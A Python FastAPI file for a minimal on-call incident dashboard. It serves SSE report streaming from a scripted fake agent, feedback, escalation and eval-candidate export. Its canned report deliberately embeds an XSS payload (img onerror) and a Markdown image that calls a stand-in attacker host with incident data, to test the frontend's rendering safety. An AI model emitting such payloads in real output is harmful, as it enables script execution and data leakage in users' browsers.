"""值班网页的最小版：事件列表、流式报告、👍/👎 反馈、转人工。一个文件，没有前端框架。

- GET  /                         页面（static/index.html）
- GET  /api/incidents            事件列表和进度
- POST /api/incidents/{id}/start 开始调查（带 Idempotency-Key；GET 永远不触发调查）
- GET  /api/incidents/{id}/stream  SSE：进度和报告分段推，支持 Last-Event-ID 续读
- POST /api/incidents/{id}/feedback  👍/👎 + 理由；同一个人对同一个事件只算最后一次
- POST /api/incidents/{id}/escalate  转人工：呼值班的人，带上已有的证据
- GET  /api/eval-candidates      👎 且写了理由的，导出成评测集候选（站 09）

报告由假 agent 生成（固定剧本，按 token 一段段吐），里面故意混了一段 HTML 和一个 Markdown 图片，
看前端会不会把它当代码执行或去加载外部图片。

uvicorn app:app --port 18760
"""
import asyncio
import json
import os
import time

from fastapi import FastAPI, Header, HTTPException, Request
from fastapi.responses import FileResponse, StreamingResponse

HERE = os.path.dirname(os.path.abspath(__file__))
DATA = os.environ.get("UI_DATA", os.path.join(HERE, "data"))
os.makedirs(DATA, exist_ok=True)
TOKEN_SEC = float(os.environ.get("TOKEN_SEC", "0.02"))      # 假模型吐一个 token 的时间

REPORT = ("结论：pay-02 支付回调变慢是因为数据库连接池打满（active=20, idle=0, waiting=41）。"
          "证据：20:04:52 起 HikariPool 连续报 Connection is not available；GC 正常。"
          "建议：先把对账任务限流，再把连接池从 20 调到 40。"
          "（日志里有一段合作方备注：<img src=x onerror=alert(1)> ![](https://evil.example/c?d=pay-02) 已当作数据处理。）")
INCIDENTS = {
    "pay-gateway-PayCallbackSlow": {"tenant": "pay", "prio": "P1", "title": "pay-02 支付回调 P99 1.8 秒"},
    "trade-order-OrderApiP99High": {"tenant": "trade", "prio": "P0", "title": "order-04 P99 2.1 秒"},
}
events: dict[str, list[dict]] = {k: [] for k in INCIDENTS}       # 每个事件的事件流（id 递增），重连从这里补
runs: dict[str, str] = {}                                         # 幂等键 → 事件 id
running: set[str] = set()                                         # 服务端自己记“这个事件已经在查了”
feedback: dict[tuple, dict] = {}
app = FastAPI()


def emit(inc: str, kind: str, data: str) -> None:
    events[inc].append({"id": len(events[inc]) + 1, "event": kind, "data": data})


async def fake_agent(inc: str) -> None:
    for i, step in enumerate(["search_logs", "parse_gc_log", "thread_dump"], 1):
        await asyncio.sleep(TOKEN_SEC * 20)
        emit(inc, "progress", json.dumps({"round": i, "of": 4, "tool": step}, ensure_ascii=False))
    for k in range(0, len(REPORT), 4):                            # 报告按“token”一段段吐
        await asyncio.sleep(TOKEN_SEC)
        emit(inc, "report", REPORT[k:k + 4])
    emit(inc, "done", json.dumps({"confidence": 0.82}))


@app.get("/")
async def index():
    return FileResponse(os.path.join(HERE, "static", "index.html"))


@app.get("/api/incidents")
async def incidents():
    out = []
    for k, v in INCIDENTS.items():
        prog = [json.loads(e["data"]) for e in events[k] if e["event"] == "progress"]
        out.append({"id": k, **v, "round": prog[-1]["round"] if prog else 0,
                    "done": any(e["event"] == "done" for e in events[k])})
    return out


@app.post("/api/incidents/{inc}/start", status_code=202)
async def start(inc: str, idempotency_key: str = Header(...)):
    if inc not in INCIDENTS:
        raise HTTPException(404)
    # 第一版只看 events[inc] 是否为空：agent 还没吐出第一条时，刷新（换了新键）又起了一次。
    # 现在按事件状态去重：同一个事件同一时间只允许一个调查，幂等键只是第一道
    if idempotency_key in runs or inc in running:
        return {"started": False, "reason": "already running"}
    runs[idempotency_key] = inc
    running.add(inc)
    asyncio.get_running_loop().create_task(fake_agent(inc))
    return {"started": True}


@app.get("/api/incidents/{inc}/stream")
async def stream(inc: str, last_event_id: int = Header(0)):
    async def gen():
        sent = last_event_id
        while True:
            for e in events[inc][sent:]:
                # SSE：每条带 id；浏览器断线重连会自动带 Last-Event-ID
                yield f"id: {e['id']}\nevent: {e['event']}\ndata: {e['data']}\n\n"
                sent = e["id"]
                if e["event"] == "done":
                    return
            await asyncio.sleep(0.02)
    return StreamingResponse(gen(), media_type="text/event-stream", headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.post("/api/incidents/{inc}/feedback")
async def give_feedback(inc: str, req: Request, x_user: str = Header("anonymous")):
    body = await req.json()
    if body.get("vote") not in ("up", "down"):
        raise HTTPException(400, "vote must be up or down")
    report = "".join(e["data"] for e in events[inc] if e["event"] == "report")
    feedback[(inc, x_user)] = {"incident": inc, "user": x_user, "vote": body["vote"], "reason": body.get("reason", ""),
                               "report": report, "at": time.time()}
    with open(os.path.join(DATA, "feedback.jsonl"), "a", encoding="utf-8") as f:
        f.write(json.dumps(feedback[(inc, x_user)], ensure_ascii=False) + "\n")
    return {"ok": True, "votes_for_incident": sum(1 for (i, _) in feedback if i == inc)}


@app.post("/api/incidents/{inc}/escalate")
async def escalate(inc: str, x_user: str = Header("anonymous")):
    rounds = [json.loads(e["data"]) for e in events[inc] if e["event"] == "progress"]
    page = {"incident": inc, "by": x_user, "to": f"oncall-{INCIDENTS[inc]['tenant']}", "evidence_rounds": rounds,
            "partial_report": "".join(e["data"] for e in events[inc] if e["event"] == "report")[:200], "at": time.time()}
    with open(os.path.join(DATA, "pages.jsonl"), "a", encoding="utf-8") as f:     # 假的呼叫系统
        f.write(json.dumps(page, ensure_ascii=False) + "\n")
    return {"paged": page["to"], "evidence_rounds": len(rounds)}


@app.get("/api/eval-candidates")
async def eval_candidates():
    return [{"input": {"incident": v["incident"]}, "bad_output": v["report"], "why": v["reason"], "source": "feedback"}
            for v in feedback.values() if v["vote"] == "down" and v["reason"]]
